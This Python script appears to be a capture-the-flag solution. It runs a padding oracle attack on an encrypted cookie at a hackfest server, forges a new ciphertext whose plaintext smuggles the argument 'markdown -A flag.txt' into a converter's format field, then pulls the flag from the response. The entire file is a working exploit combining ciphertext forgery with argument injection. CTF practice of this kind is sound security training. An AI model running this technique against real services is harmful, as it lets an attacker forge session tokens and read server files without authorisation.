import re

import requests as r
from termcolor import colored
from clipboard import copy

from padding_oracle import PaddingOracle

url = "http://hackfest.redrocket.club:32000/convert"

req = r.Session()


def oracle(cipher_hex):
    headers = {'Cookie': 'vals={}'.format(cipher_hex)}
    res = req.get(url, headers=headers)
    response = res.content

    if b'Invalid padding bytes.' not in response:
        return True
    else:
        return False


o = PaddingOracle(oracle, max_retries=-1)

cipher = 'f7aeb493e302c114f82d2a3ffe28754c421c8d937a4b7725ffda64f18c7ebaa276cc5be40e288056d1d5ff1af3802208d535007f394ddaa9a8805b30154a3094c39f0615024b06e3c2b9c12a11ed4120'
plain = b'{"f": "markdown", "c": "AAAABBBBCCCCDDDD", "t": "html4"}'
plain_new = b'{"f": "markdown -A flag.txt", "c": "DDDD", "t": "html4"}'

cipher_new = o.craft(cipher, plain, plain_new)

headers = {'Cookie': 'vals={}'.format(cipher_new)}
res = req.get(url, headers=headers)


def extractFlag(result):
    flag = re.findall(r'flag{.+}', result.text)[0]
    return flag


flag = extractFlag(res)

#print("\nCookie:", colored(cipher_new, 'red'))
print("\n" + colored(flag, 'green') + "\n")
copy(flag)

